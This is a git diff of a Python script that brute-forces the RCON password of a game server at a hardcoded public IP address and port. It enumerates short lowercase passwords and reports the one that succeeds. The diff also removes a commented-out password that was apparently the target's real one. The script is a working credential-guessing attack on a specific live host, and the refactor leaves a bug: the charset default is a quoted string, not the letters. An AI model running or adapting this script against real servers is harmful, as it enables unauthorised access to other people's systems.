@@ -3,20 +3,23 @@ import asyncio
 import string
 import time
 import sys
+import getopt
 from itertools import chain, product
 
 ip = "94.130.143.254"
 port = 27165
-# rconpassword = "gold-squid"
+
+def ip_port_parse():
+    pass
 
 
-def bruteforce(charset, maxlength):
+def bruteforce_charset(charset, maxlength):
     return (''.join(candidate)
         for candidate in chain.from_iterable(product(charset, repeat=i)
             for i in range(1, maxlength + 1)))
 
 
-async def main(loop, rconpassword):
+async def attempt_connection(loop, rconpassword):
     # Attempt rcon connection
     rcon = await aiorcon.RCON.create(ip, port, rconpassword, loop)
 
@@ -25,23 +28,25 @@ async def main(loop, rconpassword):
     print(status)
     if 'hostname:' in status:
         print("Password is:", rconpassword)
-        sys.exit(0);
+        sys.exit(0)
 
     rcon.close()
 
 
-for x in bruteforce(string.ascii_lowercase, 4):
+def bruteforce(chars='string.ascii_lowercase', lenght=4):
 
-    try:
-        loop = asyncio.get_event_loop()
-        loop.run_until_complete(main(loop, x))
-        print("TRY")
-
-    except Exception as e:
-        print("EXCEPTION")
-        error_check = repr(e)
+    for x in bruteforce_charset(chars, lenght):
+        try:
+            loop = asyncio.get_event_loop()
+            loop.run_until_complete(attempt_connection(loop, x))
+        except Exception as e:
+            error_check = repr(e)
         if 'Authentication failed' in error_check:
-            print("AUTH CHECK")
-            print("Fail:",str(e),"  [X]->  ",x)
+            print("Fail:", error_check, "  [X]->  ", x)
 
+
+if __name__ == '__main__':    
+
+
+    bruteforce()
 
